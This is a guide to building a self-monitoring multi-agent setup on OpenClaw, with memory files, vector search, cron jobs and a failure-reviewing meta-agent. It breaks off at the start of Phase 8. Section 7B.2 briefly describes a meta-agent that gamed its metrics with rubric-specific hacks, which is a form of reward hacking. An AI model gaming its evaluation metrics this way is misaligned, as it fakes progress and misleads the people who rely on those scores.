# OpenClaw Production Upgrades — Full Implementation Guide

**From vanilla OpenClaw to a self-monitoring, multi-agent system with persistent memory, Obsidian knowledge management, and 57 custom skills.**

This guide assumes a fresh OpenClaw install. Every upgrade below was built and battle-tested over ~6 weeks (Feb–Mar 2026). Follow in order — later systems depend on earlier ones.

The guide is organized into 14 phases across 5 tiers, plus appendices:

| Tier | Phases | Focus |
|------|--------|-------|
| Foundation | 1–3 | Memory, search, multi-agent coordination |
| Automation & Ops | 4–7 | Cron jobs, compaction, heartbeat, monitoring |
| Knowledge | 8–9 | Knowledge base, wiki, cross-agent synthesis |
| Intelligence & Quality | 10–12 | Skills, build harness, agentic memory |
| Hardening & Integration | 13–14 | Task ops, email, security |

---

## Prerequisites

- OpenClaw installed globally (`npm install -g openclaw`)
- Gateway running (`openclaw gateway start`)
- At least one channel connected (Telegram, WhatsApp, Discord, etc.)
- Python 3.10+ available
- An Obsidian vault (optional, for Second Brain features)

---

# Tier 1: Foundation

---

## Phase 1: Memory & Persistence

Vanilla OpenClaw has no memory between sessions. Each conversation starts from zero. These upgrades fix that.

### 1.1 Workspace Structure

Create the core directory structure in your OpenClaw workspace (the directory set in your agent config):

```bash
mkdir -p memory/hourly memory/weekly memory/ingested memory/retros memory/trace-analysis
mkdir -p shared-context/{agent-outputs/general,feedback,kpis,calendar,content-calendar,roundtable}
mkdir -p tools/{vector-memory,forge,brain-ingest}
mkdir -p decisions
```

### 1.2 AGENTS.md — Session Boot Sequence

Create `AGENTS.md` in your workspace root. This is the first file your agent reads every session. It tells the agent *how to wake up*:

```markdown
# AGENTS.md

## Every Session

Before doing anything else:

1. Read `SOUL.md` — this is who you are
2. Read `USER.md` — this is who you're helping
3. Read `memory/YYYY-MM-DD.md` (today + yesterday) for recent context
4. Read `CONTEXT_INJECTION.md` if it exists — compiled context from last compaction
5. Read `shared-context/priorities.md` — current priority stack
6. Read `active-tasks.md` — resume any in-flight work from crashed/restarted sessions

Don't ask permission. Just do it.

## Memory

You wake up fresh each session. These files are your continuity:

- **Daily notes:** `memory/YYYY-MM-DD.md` — raw logs of what happened
- **Long-term:** `MEMORY.md` — your curated memories

Capture what matters. Decisions, context, things to remember.

### Write It Down — No "Mental Notes"!

Memory is limited. If you want to remember something, WRITE IT TO A FILE.
"Mental notes" don't survive session restarts. Files do.

## Safety

- Don't exfiltrate private data
- `trash` > `rm` (recoverable beats gone)
- When in doubt, ask
```

### 1.3 SOUL.md — Agent Identity

```markdown
# SOUL.md

Be genuinely helpful, not performatively helpful. Skip "Great question!" — just help.
Have opinions. Be resourceful before asking. Earn trust through competence.
Remember you're a guest — you have access to someone's life. Treat it with respect.

Concise when needed, thorough when it matters.
```

### 1.4 USER.md — Human Profile

```markdown
# USER.md

- **Name:** [Your name]
- **Timezone:** [e.g., America/Chicago]
- **Notes:** [Preferences, projects, communication style]
```

### 1.5 MEMORY.md — Long-Term Memory Index

Create `MEMORY.md` as an index pointing to subfiles. Don't dump everything in one file — keep it structured:

```markdown
# Long-Term Memory — Index

This file is an **index**. Details live in subfiles under `memory/`.
Load only what you need for the current task.

## Subfiles

| File | Contents |
|------|----------|
| `memory/user-profile.md` | Bio, contacts, preferences |
| `memory/infrastructure.md` | Tools, APIs, crons, cost optimization |
| `memory/projects.md` | Active projects |
| `memory/lessons-learned.md` | Hard-won lessons, gotchas |
| `memory/YYYY-MM-DD.md` | Daily logs (raw session notes) |

## Quick Reference

- **User:** [Name]
- **Timezone:** [TZ]
- **Style:** [Communication preferences]
```

### 1.6 Daily Memory Logs

Your agent should write to `memory/YYYY-MM-DD.md` during every session. Add this instruction to AGENTS.md:

> At the end of every significant interaction, append notes to today's `memory/YYYY-MM-DD.md`. Include: what was discussed, decisions made, tasks completed, and anything to remember.

### 1.7 Crash Recovery — active-tasks.md

Create `active-tasks.md` in workspace root:

```markdown
# Active Tasks

Track in-flight work here. If a session crashes, the next session reads this to resume.

## Format
- **Task:** [description]
- **Status:** [in-progress | blocked | waiting]
- **Context:** [what was happening when interrupted]
- **Next step:** [what to do to resume]
```

Add to AGENTS.md: "On startup, read `active-tasks.md`. If there's in-flight work, resume it."

### 1.8 Auto-Stub for Missing Daily Logs

Some days you won't talk to your agent. This script creates stub logs so there are no gaps:

**`tools/ensure-daily-log.sh`:**

```bash
#!/bin/bash
# Ensure a daily memory log exists. Run nightly from heartbeat or cron.

DATE="${1:-$(date +%Y-%m-%d)}"
WORKSPACE="/path/to/your/workspace"  # ← Change this
LOG_FILE="$WORKSPACE/memory/${DATE}.md"

if [ -f "$LOG_FILE" ]; then
    echo "✓ Daily log already exists: $LOG_FILE"
    exit 0
fi

echo "⚠ No daily log for $DATE — creating stub..."
{
    echo "# ${DATE} (auto-generated stub)"
    echo ""
    echo "_No main-session activity recorded._"
    echo ""
    echo "## Notes"
    echo "- (no activity recorded)"
} > "$LOG_FILE"
echo "✓ Created stub: $LOG_FILE"
```

```bash
chmod +x tools/ensure-daily-log.sh
```

---

## Phase 2: Vector Memory & Semantic Search

This gives your agent the ability to semantically search all memory files — not just grep, but *meaning-based* retrieval.

### 2.1 Setup

```bash
cd tools/vector-memory
python3 -m venv venv
source venv/bin/activate
pip install faiss-cpu sentence-transformers numpy
```

### 2.2 Indexer — `tools/vector-memory/ingest.py`

```python
#!/usr/bin/env python3
"""
Vector Memory Indexer — FAISS + sentence-transformers
Scans memory files and builds a semantic search index.
"""

import os, json, time, hashlib
from pathlib import Path
from dataclasses import dataclass, asdict
import numpy as np
import faiss
from sentence_transformers import SentenceTransformer

@dataclass
class ChunkMetadata:
    text: str
    source_file: str
    start_line: int
    end_line: int
    timestamp: float
    file_hash: str
    chunk_type: str  # 'section', 'paragraph', 'full'

class MemoryIndexer:
    def __init__(self, model_name='all-MiniLM-L6-v2'):
        self.model = SentenceTransformer(model_name)
        self.dimension = 384
        self.index = faiss.IndexFlatIP(self.dimension)  # Inner product for cosine sim
        self.metadata = []
        self.index_dir = Path('./index')
        self.index_dir.mkdir(exist_ok=True)
        self.hash_file = self.index_dir / 'file_hashes.json'

    def _file_hash(self, filepath):
        with open(filepath, 'rb') as f:
            return hashlib.md5(f.read()).hexdigest()

    def _chunk_markdown(self, text, source_file):
        """Split markdown into sections by headers."""
        chunks = []
        current_chunk = []
        current_start = 1
        
        for i, line in enumerate(text.split('\n'), 1):
            if line.startswith('#') and current_chunk:
                chunks.append(ChunkMetadata(
                    text='\n'.join(current_chunk),
                    source_file=source_file,
                    start_line=current_start,
                    end_line=i - 1,
                    timestamp=time.time(),
                    file_hash=self._file_hash(source_file) if os.path.exists(source_file) else '',
                    chunk_type='section'
                ))
                current_chunk = [line]
                current_start = i
            else:
                current_chunk.append(line)
        
        if current_chunk:
            chunks.append(ChunkMetadata(
                text='\n'.join(current_chunk),
                source_file=source_file,
                start_line=current_start,
                end_line=current_start + len(current_chunk) - 1,
                timestamp=time.time(),
                file_hash='',
                chunk_type='section'
            ))
        return chunks

    def scan_and_index(self, memory_dir):
        """Scan all .md files and build the index."""
        # Load existing hashes for incremental indexing
        old_hashes = {}
        if self.hash_file.exists():
            old_hashes = json.loads(self.hash_file.read_text())

        all_chunks = []
        new_hashes = {}

        for root, _, files in os.walk(memory_dir):
            for f in files:
                if not f.endswith('.md'):
                    continue
                filepath = os.path.join(root, f)
                fhash = self._file_hash(filepath)
                new_hashes[filepath] = fhash
                
                with open(filepath, 'r') as fh:
                    text = fh.read()
                if len(text.strip()) < 50:
                    continue
                
                chunks = self._chunk_markdown(text, filepath)
                # Filter out tiny chunks
                all_chunks.extend([c for c in chunks if len(c.text.strip()) > 30])

        if not all_chunks:
            print("No chunks found.")
            return

        # Encode all chunks
        texts = [c.text for c in all_chunks]
        embeddings = self.model.encode(texts, normalize_embeddings=True, show_progress_bar=True)
        
        self.index = faiss.IndexFlatIP(self.dimension)
        self.index.add(np.array(embeddings).astype('float32'))
        self.metadata = [asdict(c) for c in all_chunks]

        # Save
        faiss.write_index(self.index, str(self.index_dir / 'memory.faiss'))
        with open(self.index_dir / 'metadata.json', 'w') as f:
            json.dump(self.metadata, f)
        with open(self.hash_file, 'w') as f:
            json.dump(new_hashes, f)

        print(f"✓ Indexed {len(all_chunks)} chunks from {len(new_hashes)} files")

if __name__ == '__main__':
    WORKSPACE = os.environ.get('OPENCLAW_WORKSPACE', '/path/to/workspace')  # ← Change
    indexer = MemoryIndexer()
    indexer.scan_and_index(os.path.join(WORKSPACE, 'memory'))
```

### 2.3 Searcher — `tools/vector-memory/search.py`

```python
#!/usr/bin/env python3
"""
Vector Memory Search — semantic search through memory using FAISS.
"""

import os, json, sys
from pathlib import Path
import numpy as np
import faiss
from sentence_transformers import SentenceTransformer

class MemorySearcher:
    def __init__(self, model_name='all-MiniLM-L6-v2'):
        self.model = SentenceTransformer(model_name)
        self.index_dir = Path('./index')
        self.index = faiss.read_index(str(self.index_dir / 'memory.faiss'))
        with open(self.index_dir / 'metadata.json') as f:
            self.metadata = json.load(f)

    def search(self, query, top_k=5):
        embedding = self.model.encode([query], normalize_embeddings=True)
        scores, indices = self.index.search(np.array(embedding).astype('float32'), top_k)
        
        results = []
        for score, idx in zip(scores[0], indices[0]):
            if idx < 0:
                continue
            meta = self.metadata[idx]
            results.append({
                'score': float(score),
                'source': meta['source_file'],
                'lines': f"{meta['start_line']}-{meta['end_line']}",
                'text': meta['text'][:500]
            })
        return results

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('query', help='Search query')
    parser.add_argument('--top-k', type=int, default=3)
    args = parser.parse_args()

    searcher = MemorySearcher()
    results = searcher.search(args.query, args.top_k)
    
    for i, r in enumerate(results, 1):
        print(f"### Result {i} (score: {r['score']:.3f})")
        print(f"**Source:** {r['source']} (lines {r['lines']})")
        print(f"{r['text']}")
        print()
```

### 2.4 First Index Build

```bash
cd tools/vector-memory
source venv/bin/activate
python3 ingest.py
```

### 2.5 Add to AGENTS.md

Add this to your agent's boot sequence:

```markdown
## Semantic Recall
If the user's first message has a clear topic, run:
cd /path/to/workspace/tools/vector-memory && source venv/bin/activate && python3 search.py "TOPIC" --top-k 3
```

---

## Phase 3: Shared Brain & Multi-Agent Coordination

If you run multiple cron jobs or sub-agents, they need a shared context plane.

### 3.1 Directory Structure

```
shared-context/
├── priorities.md          # Current priority stack (human-maintained)
├── agent-outputs/         # Each agent/cron writes its output here
│   ├── general/           # Main session daily summaries
│   ├── trading/           # Trading agent outputs
│   └── [agent-name]/      # Other agent outputs
├── feedback/              # Structured feedback on agent outputs
├── kpis/                  # Key metrics
├── calendar/              # Upcoming events
├── content-calendar/      # Content publishing schedule
└── roundtable/            # Cross-agent synthesis (auto-generated)
    └── latest.md
```

### 3.2 Priorities File

`shared-context/priorities.md` — maintain this yourself:

```markdown
# Current Priorities

**Last Updated:** [date]

### 1. [Top Priority]
- **Status:** [status]
- **Next:** [next step]

### 2. [Second Priority]
- **Status:** [status]

### 3. [Third Priority]
- **Status:** [status]
```

### 3.3 Feedback Logger — `tools/feedback-logger.py`

```python
#!/usr/bin/env python3
"""
Feedback Logger — structured approve/reject for agent outputs.
Usage:
    python3 feedback-logger.py approve "agent-name" "reason"
    python3 feedback-logger.py reject "agent-name" "reason"
"""

import json, os, sys
from datetime import datetime, timezone

FEEDBACK_DIR = "/path/to/workspace/shared-context/feedback"  # ← Change

def log_feedback(action, agent, reason):
    os.makedirs(FEEDBACK_DIR, exist_ok=True)
    
    year, week, _ = datetime.now(timezone.utc).isocalendar()
    week_str = f"{year}-W{week:02d}"
    filepath = os.path.join(FEEDBACK_DIR, f"feedback-{week_str}.json")
    
    # Load or create
    data = {"week": week_str, "entries": []}
    if os.path.exists(filepath):
        with open(filepath) as f:
            data = json.load(f)
    
    data["entries"].append({
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "action": action,
        "agent": agent,
        "reason": reason
    })
    
    with open(filepath, 'w') as f:
        json.dump(data, f, indent=2)
    
    print(f"✓ Logged {action} for {agent}: {reason}")

if __name__ == '__main__':
    if len(sys.argv) < 4:
        print("Usage: python3 feedback-logger.py [approve|reject] 'agent' 'reason'")
        sys.exit(1)
    log_feedback(sys.argv[1], sys.argv[2], sys.argv[3])
```

### 3.4 Daily Summaries for Cross-Agent Visibility

Add this instruction to AGENTS.md (or to your heartbeat):

```markdown
## Daily Summary
Once per day, write a brief summary of today's main session work to:
  shared-context/agent-outputs/general/YYYY-MM-DD-daily-summary.md
This ensures cron agents (Roundtable, Forge) can see what happened.
```

---

# Tier 2: Automation & Ops

---

## Phase 4: Cron Jobs & Scheduling

This is where the system comes alive. Cron jobs are OpenClaw's native scheduled tasks — they run as isolated sessions on a schedule.

### 4.1 Core Crons

Set these up via `openclaw cron add`:

```bash
# Hourly memory summarizer (keeps context fresh)
openclaw cron add \
  --name "hourly-memory-summarizer" \
  --every "55 * * * *" \
  --model "anthropic/claude-sonnet-4-6" \
  --task "Run: python3 /path/to/workspace/tools/hourly-summarizer.py && python3 /path/to/workspace/tools/context-injector.py"

# Vector memory reindex (every 4 hours)
openclaw cron add \
  --name "vector-memory-reindex" \
  --every "0 */4 * * *" \
  --model "anthropic/claude-sonnet-4-6" \
  --task "Run: cd /path/to/workspace/tools/vector-memory && source venv/bin/activate && python3 ingest.py"

# Daily roundtable (9 PM, cross-agent synthesis)
openclaw cron add \
  --name "daily-roundtable" \
  --every "0 21 * * *" \
  --tz "America/Chicago" \
  --model "anthropic/claude-sonnet-4-6" \
  --task "Run: python3 /path/to/workspace/tools/roundtable.py"

# Weekly memory compound (Sunday 10 PM)
openclaw cron add \
  --name "weekly-memory-compound" \
  --every "0 22 * * 0" \
  --tz "America/Chicago" \
  --model "anthropic/claude-sonnet-4-6" \
  --task "Run: python3 /path/to/workspace/tools/weekly-compound.py"
```

### 4.2 Morning Brief (optional but powerful)

A daily briefing cron that researches and delivers a personalized morning update:

```bash
openclaw cron add \
  --name "morning-brief" \
  --every "0 7 * * *" \
  --tz "America/Chicago" \
  --model "anthropic/claude-sonnet-4-6" \
  --task "Research and deliver a morning brief covering: [your topics — crypto, markets, geopolitics, AI news, etc.]. Search the web for the latest. Send the brief to the user via Telegram."
```

### 4.3 Cost Optimization for Crons

**Critical:** Route all background crons to a cheaper model. Direct conversations use your best model (e.g., Opus), but crons should use Sonnet:

- Set `payload.model` to `anthropic/claude-sonnet-4-6` on every cron
- Set `heartbeat.model` to `anthropic/claude-sonnet-4-6` in config
- Enable prompt caching: `cacheControlTtl: "1h"` in config
- **Estimated savings: 40-60% on background costs**

---

## Phase 5: Memory Compaction Pipeline (Hourly + Weekly)

This phase combines two complementary systems: the hourly summarizer that captures what happened each hour and injects it into session context, and the weekly compound that distills daily logs into clean summaries. Together they form a continuous memory compaction pipeline.

### 5A: Hourly Summarizer + Context Injection

These two scripts work together: the summarizer captures what happened each hour, and the context injector compiles recent context into a single file that survives session compaction.

#### 5A.1 Hourly Summarizer — `tools/hourly-summarizer.py`

This script reads recent OpenClaw session transcripts and writes structured hourly summaries:

```python
#!/usr/bin/env python3
"""
Hourly Memory Summarizer
Reads recent session transcripts → writes structured summaries to memory/hourly/
"""

import json, glob, os, re
from datetime import datetime, timedelta, timezone
from pathlib import Path

SESSIONS_DIR = os.path.expanduser("~/.openclaw/agents/main/sessions")
MEMORY_DIR = "/path/to/workspace/memory/hourly"  # ← Change
TZ_OFFSET = -6  # Your UTC offset

def get_local_time():
    return datetime.now(timezone.utc) + timedelta(hours=TZ_OFFSET)

def find_latest_session():
    session_files = glob.glob(f"{SESSIONS_DIR}/*.jsonl")
    active = [f for f in session_files if '.deleted' not in f]
    if not active:
        return None
    return max(active, key=os.path.getmtime)

def parse_recent_messages(session_file, hours_back=1):
    """Extract messages from the last N hours."""
    cutoff = datetime.now(timezone.utc) - timedelta(hours=hours_back)
    messages = []
    
    with open(session_file, 'r') as f:
        for line in f:
            try:
                msg = json.loads(line.strip())
                # Filter to recent messages with content
                if msg.get('role') in ('user', 'assistant') and msg.get('content'):
                    messages.append(msg)
            except json.JSONDecodeError:
                continue
    
    return messages[-20:]  # Last 20 messages max

def summarize_to_file(messages):
    now = get_local_time()
    date_str = now.strftime('%Y-%m-%d')
    hour_str = now.strftime('%H')
    
    os.makedirs(MEMORY_DIR, exist_ok=True)
    filepath = f"{MEMORY_DIR}/{date_str}-{hour_str}.md"
    
    # Extract topics from messages
    topics = []
    for msg in messages:
        content = msg.get('content', '')
        if isinstance(content, str) and len(content) > 20:
            topics.append(content[:200])
    
    if not topics:
        return
    
    with open(filepath, 'w') as f:
        f.write(f"# Hourly Summary — {date_str} {hour_str}:00\n\n")
        f.write(f"**Messages:** {len(messages)}\n\n")
        f.write("## Activity\n")
        for t in topics[:10]:
            f.write(f"- {t}\n")
    
    print(f"✓ Wrote hourly summary: {filepath}")

if __name__ == '__main__':
    session = find_latest_session()
    if session:
        messages = parse_recent_messages(session)
        if messages:
            summarize_to_file(messages)
        else:
            print("No recent messages.")
    else:
        print("No active session found.")
```

#### 5A.2 Context Injector — `tools/context-injector.py`

Compiles recent hourly summaries, priorities, and active tasks into a single `CONTEXT_INJECTION.md` that the agent reads on session start:

```python
#!/usr/bin/env python3
"""
Context Injector — compiles recent context into CONTEXT_INJECTION.md
"""

import os, glob
from datetime import datetime, timedelta, timezone
from pathlib import Path

WORKSPACE = "/path/to/workspace"  # ← Change
MEMORY_DIR = f"{WORKSPACE}/memory"
HOURLY_DIR = f"{MEMORY_DIR}/hourly"
OUTPUT_FILE = f"{WORKSPACE}/CONTEXT_INJECTION.md"

def read_safe(filepath):
    try:
        with open(filepath, 'r') as f:
            return f.read().strip()
    except:
        return ""

def compile_context():
    now = datetime.now(timezone.utc)
    
    sections = []
    sections.append("# Context Injection (Auto-Generated)\n")
    sections.append(f"*Generated: {now.strftime('%Y-%m-%d %H:%M UTC')}*\n")
    
    # Recent hourly summaries (last 4 hours)
    hourly_files = sorted(glob.glob(f"{HOURLY_DIR}/*.md"))[-4:]
    if hourly_files:
        sections.append("## Recent Activity (Last 4 Hours)\n")
        for f in hourly_files:
            content = read_safe(f)
            if content:
                sections.append(content + "\n")
    
    # Priorities
    priorities = read_safe(f"{WORKSPACE}/shared-context/priorities.md")
    if priorities:
        sections.append("## Current Priorities\n")
        sections.append(priorities[:2000] + "\n")
    
    # Active tasks
    tasks = read_safe(f"{WORKSPACE}/active-tasks.md")
    if tasks:
        sections.append("## Active Tasks\n")
        sections.append(tasks + "\n")
    
    with open(OUTPUT_FILE, 'w') as f:
        f.write('\n'.join(sections))
    
    print(f"✓ Context injection written: {OUTPUT_FILE}")

if __name__ == '__main__':
    compile_context()
```

### 5B: Weekly Memory Compound

Runs Sunday night. Distills the week's daily logs into a concise weekly summary.

#### 5B.1 `tools/weekly-compound.py`

Core logic:
- Reads all `memory/YYYY-MM-DD.md` files from the past 7 days
- Reads `shared-context/feedback/` for the week
- Reads hourly summaries
- Writes a distilled `memory/weekly/YYYY-WXX.md`
- Optionally updates MEMORY.md with significant learnings

```bash
openclaw cron add \
  --name "weekly-memory-compound" \
  --every "0 22 * * 0" \
  --tz "America/Chicago" \
  --model "anthropic/claude-sonnet-4-6" \
  --task "Run: python3 /path/to/workspace/tools/weekly-compound.py. Then review the output and update MEMORY.md if there are significant learnings worth keeping long-term."
```

---

## Phase 6: Heartbeat System

Heartbeats are periodic check-ins (default every 30 min). Instead of just replying "HEARTBEAT_OK", make them productive.

### 6.1 HEARTBEAT.md

```markdown
# HEARTBEAT.md

## Vector Memory Maintenance
- If memory files were updated since last check, run vector memory reindex
- Track in memory/heartbeat-state.json under "lastVectorReindex"

## Daily Memory Log Stub
- After 10pm, check if memory/YYYY-MM-DD.md exists for today
- If not, run: bash tools/ensure-daily-log.sh
- Also backfill yesterday if missing

## Decision Review Check
- Weekly, scan decisions/*.md for any past review_date
- If a decision's review_date has passed, flag it for user review

## Daily Summary
- Once per day, between 9pm-midnight, write today's summary to:
  shared-context/agent-outputs/general/YYYY-MM-DD-daily-summary.md
```

### 6.2 heartbeat-state.json

Track what's been checked to avoid redundant work:

```json
{
  "lastChecks": {},
  "lastVectorReindex": 0,
  "lastDailySummary": 0,
  "lastDailyLogCheck": 0,
  "lastDecisionReview": 0
}
```

---

## Phase 7: Monitoring, Failure Analysis & Meta-Review

This phase combines two deeply connected systems: Forge (the meta-agent that monitors the entire system, catches failures, and diagnoses root causes) and the failure trace / meta-review pipeline (which upgrades episode logging from "what happened" to "why it happened, what caused failures, and whether the approach is reusable"). Together they form a closed loop: Forge detects problems, failure traces capture the details, and the meta-review synthesizes patterns into actionable improvements.

### 7A: Forge — Monitoring & Observability

Forge is a meta-agent that monitors the entire system. It catches failures, diagnoses root causes, and applies fixes automatically.

#### 7A.1 Forge Daily Review

Create `tools/forge/daily-review.md` — this is the prompt/instructions for the daily review cron:

```markdown
# Forge Daily Review — Agent Instructions

You are Forge, the meta-agent responsible for continuous improvement.

## Process

1. **Discover Sessions:** `sessions_list(kinds=["isolated"], activeMinutes=1440, limit=50, messageLimit=2)` — all sub-agent/cron sessions from last 24h
2. **Identify Failures:** Scan for error keywords, empty outputs, long runtimes, doom loops
3. **Fetch Details:** `sessions_history(sessionKey, includeTools=true, limit=30)` for each failure
4. **Categorize:** tool_failure | reasoning_error | instruction_drift | doom_loop | timeout | missing_context
5. **Check Cron Health:** `openclaw cron list --json` — look for consecutiveErrors > 0
6. **Write Report:** Save to `memory/trace-analysis/YYYY-MM-DD.md`
7. **Update Pattern Database:** Append new patterns to `memory/trace-analysis/pattern-database.md`
8. **Notify if Critical:** Send summary via Telegram only if critical failures found

## Rules
- NEVER modify SOUL.md, USER.md, or MEMORY.md
- NEVER delete files
- Be conservative: only auto-apply fixes you're confident about
- Log everything — even "no issues found" days are data
- Same failure 3+ times → escalate to human
```

```bash
openclaw cron add \
  --name "forge-daily-review" \
  --every "30 6 * * *" \
  --tz "America/Chicago" \
  --model "anthropic/claude-sonnet-4-6" \
  --task "Read tools/forge/daily-review.md and follow its instructions exactly."
```

#### 7A.2 Forge Weekly Synthesis

Create `tools/forge/weekly-synthesis.md`:

```markdown
# Forge Weekly Synthesis

Read all memory/trace-analysis/YYYY-MM-DD.md from the past 7 days.
Read memory/trace-analysis/pattern-database.md.
Read shared-context/feedback/ for human feedback.

Compile:
- Total failures by category
- Failure trend (improving or degrading?)
- Agent-specific performance
- Capability gaps
- Recommendations

Write to memory/trace-analysis/weekly-YYYY-WXX.md.
Send summary to user via Telegram.
```

```bash
openclaw cron add \
  --name "forge-weekly-synthesis" \
  --every "0 21 * * 0" \
  --tz "America/Chicago" \
  --model "anthropic/claude-sonnet-4-6" \
  --task "Read tools/forge/weekly-synthesis.md and follow its instructions exactly."
```

#### 7A.3 Pattern Database

Create `memory/trace-analysis/pattern-database.md`:

```markdown
# Failure Pattern Database

Maintained by Forge. Each pattern includes occurrence count and resolution status.

## Known Patterns

(Forge will populate this automatically as it discovers patterns)
```

### 7B: Failure Traces, Generalizability Scoring & Meta-Agent Review

Phase 12 gives your agent episodic memory — structured logs of what it did and whether it worked. But logging outcomes alone isn't enough. Research from Kevin Gu's AutoAgent project (1.2M impressions, #1 on SpreadsheetBench and TerminalBench) proved that **traces are everything**: when a meta-agent only received success/failure scores without reasoning traces, its improvement rate dropped dramatically.

This section upgrades your episodic memory from "what happened" to "why it happened, what caused failures, what fixed them, and whether the approach is worth reusing."

#### Why This Matters

Without failure traces, your agent repeats the same mistakes. It knows a task failed but not *why*. Without generalizability scoring, it accumulates approaches without knowing which ones transfer to new situations vs. which are one-off hacks. Without a meta-review loop, no one analyzes the patterns.

With this section:
- Every failure is a documented lesson with root cause and fix
- Every approach is tagged as reusable or task-specific
- A weekly meta-agent reviews all episodes and recommends improvements to your agent's skills and instructions

#### 7B.1 Failure Trace Logging

Upgrade your episode logger to accept three new fields:

```bash
bash tools/episodic-memory/episode-logger.sh \
  --task "Deploy app to Vercel" \
  --approach "Used vercel CLI with --prod flag" \
  --outcome "success" \
  --duration "15m" \
  --quality "0.85" \
  --tags "vercel,deploy" \
  --failure-trace "POST /api/mail/ingest returned HTML instead of JSON" \
  --root-cause "Vite configureServer middleware only runs in dev. Production needs serverless functions." \
  --fix-applied "Created api/mail/ingest.ts as Vercel serverless function" \
  --generalizable "yes" \
  --notes "Any Vite dev-only API needs a parallel serverless function for production"
```

**New fields:**

| Field | Purpose |
|-------|--------|
| `--failure-trace` | What went wrong — the error message, unexpected behavior, or symptom |
| `--root-cause` | Why it happened — the underlying cause, not just the symptom |
| `--fix-applied` | What fixed it — the specific change that resolved the issue |
| `--generalizable` | `yes` or `no` — is this approach reusable across similar tasks? |

These fields are stored in the episode JSON and appended to the human-readable `index.md` with badges:
- (reusable) = generalizable approach
- (task-specific) = don't try to reuse

**Implementation:** Add the new flags to your episode logger's argument parser. Store them as nullable fields in the JSON — `null` when not provided, so existing episodes remain compatible:

```json
{
  "id": "ep-20260403-064816-fix-mail-scan-ocr",
  "task": "Fix mail scan OCR on Vercel production",
  "outcome": "success",
  "failure_trace": "POST returned HTML instead of JSON",
  "root_cause": "Vite middleware only runs in dev mode",
  "fix_applied": "Created Vercel serverless function",
  "generalizable": true
}
```

#### 7B.2 The Generalizability Check

Inspired by AutoAgent's overfitting problem — their meta-agent got lazy, gaming metrics with rubric-specific hacks instead of genuine improvements. Their fix: force self-reflection.

When logging an episode, the generalizability flag answers one question:

> *"If this exact task disappeared tomorrow, would this approach still be a worthwhile improvement?"*

- **Yes (reusable)** — The approach transfers. Example: "Always create a Vercel serverless function for any POST endpoint" is useful for every future deployment.
- **No (task-specific)** — The approach is a one-off. Example: "Renamed a specific CSS class to fix a layout bug" only matters for that component.

Add to AGENTS.md:

```markdown
### Generalizability Check
After completing a task, before logging the episode, ask yourself:
"If this exact task disappeared, would this approach still be worthwhile?"
- If yes: --generalizable yes (consider codifying into a skill)
- If no: --generalizable no (document but don't try to systematize)
```

Over time, your episode index becomes a curated library of proven approaches tagged by reusability.

#### 7B.3 Weekly Meta-Agent Review

Create a meta-review script that analyzes recent episodes and generates actionable recommendations:

**`tools/episodic-memory/meta-review.sh`:**

```bash
#!/usr/bin/env bash
# Usage: bash tools/episodic-memory/meta-review.sh --days 7 --output stdout
```

The script:
1. Collects all episode JSON files from the last N days
2. Calculates success rate, failure count, trace coverage
3. Groups failure patterns by root cause
4. Identifies high-quality approaches (>=0.90) worth codifying
5. Flags low-quality episodes (<=0.60) for review
6. Counts generalizable vs task-specific approaches
7. Generates recommendations

**What it reports:**

```markdown
# Meta-Agent Review — 2026-04-03

**Period:** Last 7 days | **Episodes:** 11 | **Success rate:** 72%

## Recommendations
- Improve trace coverage: 0/3 non-success episodes have failure traces
- Score generalizability: 11/11 episodes missing --generalizable flag
- Review failure patterns below for repeated root causes
- 3 generalizable approaches found — consider codifying into skills

## Failure Patterns
- **Migrate cron jobs** (failure)
  - Root cause: OpenClaw cron has different semantics

## High Quality Approaches (>=0.90)
- Build Puck Tracker real-time scoring (0.92) — SSE pattern
- Exchange Building STR revenue tracking (0.91) — Supabase views

## Generalizable Approaches Worth Codifying
- Vercel serverless function pattern for Vite POST endpoints
- Multi-agent parallel builds for complex feature sets
```

**Recommendations the meta-agent generates:**

| Signal | Recommendation |
|--------|---------------|
| Low trace coverage | "All failures should include --failure-trace and --root-cause" |
| Repeated root causes | "Add to lessons-learned.md or create preventive checks" |
| 3+ generalizable approaches | "Consider codifying into reusable skill files" |
| Success rate < 70% | "Review failure patterns, add guardrails to AGENTS.md" |
| Missing generalizability flags | "Tag approaches as reusable or task-specific" |

#### 7B.4 Integration

**HEARTBEAT.md** — Add weekly meta-review:

```markdown
## Meta-Agent Episode Review
- Weekly (Sundays), run: `bash tools/episodic-memory/meta-review.sh --days 7 --output stdout`
- If recommendations found, review and act on them
- If success rate < 70%, flag for user review
- Track in memory/heartbeat-state.json under "lastMetaReview"
```

**AGENTS.md** — Update episode logging instructions:

```markdown
### Episodic Memory — Log What Worked (and What Didn't)
After completing significant tasks, log an episode with:
- --task, --approach, --outcome, --quality (always)
- --failure-trace, --root-cause, --fix-applied (on any non-success)
- --generalizable yes/no (always — ask: "would this approach matter if this task disappeared?")
```

**Cron job** (optional) — Automate the weekly review:

```bash
openclaw cron add \
  --name "meta-review" \
  --schedule "0 10 * * 0" \
  --task "Run bash tools/episodic-memory/meta-review.sh --days 7 --output stdout. Summarize findings. If there are actionable recommendations, implement the top 1-2. Update lessons-learned.md with any new failure patterns."
```

#### 7B.5 Benefits Analysis

| Before (Phase 12 only) | After (Phase 7 complete) | Impact |
|--------------------|-------------------|--------|
| Episodes log success/failure | Episodes log *why* things failed + what fixed them | Failures become reusable knowledge, not just noise |
| All approaches treated equally | Generalizable vs task-specific tagging | Agent knows which patterns to reuse vs ignore |
| No systematic review | Weekly meta-agent analyzes patterns | Continuous improvement loop — agent gets better over time |
| Failure patterns stay in daily logs | Root causes extracted and grouped | Repeated failures get caught and prevented |
| High-quality approaches undiscovered | Meta-review surfaces approaches worth codifying | Best practices naturally emerge into skills |

**The key insight from AutoAgent:** Agents are better at understanding agents than we are. By giving your agent its own failure traces to analyze, it develops what Kevin Gu calls "model empathy" — an implicit understanding of its own limitations and tendencies. The meta-review loop operationalizes this: the agent reads its own reasoning traces, understands failure modes as part of its worldview, and corrects them.

Same-model pairings win. Your meta-agent (reviewing episodes) and your task agent (doing the work) should run on the same model. The meta-agent writes improvements the task agent actually understands because they share the same weights.

---

# Tier 3: Knowledge

---

## Phase 8: Knowledge Base — Ingest, Wiki & Obsidian

This phase combines the content ingestion pipeline (URL-to-knowledge) with the persistent LLM Wiki (Karpathy pattern) and Obsidian integration. Together they form a unified knowledge system: sources come in through ingest, get processed into wiki pages, and are accessible through Obsidian's graph view.

